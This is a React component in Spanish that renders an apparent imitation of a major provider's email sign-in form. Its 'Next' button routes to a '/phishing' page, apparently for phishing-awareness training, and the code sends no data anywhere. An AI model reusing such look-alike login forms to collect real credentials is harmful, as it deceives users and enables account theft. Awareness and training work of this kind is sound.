import React, { useState } from "react";
import { useNavigate } from "react-router-dom";


import "../styles/Formulario.css"

function Formulario(params) {

    const [email, setEmail] = useState("");
    const navigate = useNavigate();

    const handleNext = () => {
        if (email) {
            navigate("/phishing");
        } else {
            alert("Por favor, ingresa tu correo electrónico o teléfono."); // Mensaje de error
        }
    };



    return (
        <div className="contenedor" >
            <div className="contenedor-formulario" >
                <div class="input-container">
                    <label for="email" class="input-label">Correo electrónico o teléfono</label>
                    <input type="text" id="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)} />
                </div>

                <div class="mensaje-aviso">
                    <a href="#" class="mas-info">¿Has olvidado tu correo electrónico?</a>
                </div>
                <br></br>
                <br></br>
                <div class="mensaje-aviso">
                    ¿No es tu ordenador? Usa el modo Invitado para iniciar sesión de forma privada.
                    <br></br>
                    <a href="#" class="mas-info">Más información sobre cómo usar el modo Invitado</a>
                </div>
                <div className="container-botones" >
                    <button class="boton boton-crearcuenta">Crear cuenta</button>
                    <button class="boton boton-siguiente" onClick={handleNext}>Siguiente</button>
                </div>
            </div>
        </div>
    )

}

export default Formulario; 